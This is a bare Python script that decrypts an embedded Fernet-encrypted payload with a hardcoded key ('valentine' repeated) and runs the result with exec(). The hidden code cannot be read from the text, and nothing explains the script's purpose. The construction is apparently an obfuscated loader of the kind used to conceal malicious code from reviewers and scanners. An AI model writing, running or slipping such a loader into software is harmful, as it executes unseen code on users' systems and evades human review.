import base64
from cryptography.fernet import Fernet

payload = b'gAAAAABpfPOKqvM_8c9Oqu4QXZ1_h-10bXEMl9cMvgALNZuxkgYEG8rSljtenMFBJoFAxogYGghuJ1ClfgL8UndIB4Y5n_uJGofEBMd2cuilK8GDuwoZHNzsXqGJT7vpqxRjRTcWjIkwB1O1Vlr2mLlYQwHGwlaEPLVRiIAY4fPqclI9PJ9F8uht8gQL0cTGisyBqpMhpMHXsQXINj9-L_KlBVWFcjN-mhqlleb785HVENJPhlmzNNJrsUYbrobYCcWI4RbqfGGS7p_LUEMUh2m9GB61UwnkRA=='
key_str = 'valentinevalentinevalentinevalen'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
exec(plain.decode())
